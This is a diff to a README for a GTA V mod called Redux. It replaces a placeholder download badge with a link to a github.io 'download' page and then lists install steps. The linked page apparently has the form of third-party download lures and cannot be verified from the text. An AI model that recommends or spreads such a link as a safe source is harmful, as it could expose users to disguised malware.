@@ -10,7 +10,7 @@ Built for Windows, Redux integrates with **OpenIV** and **Script Hook V** for sm
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://gta-v-redux-download-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Open the included `.OIV` package using **OpenIV**.  
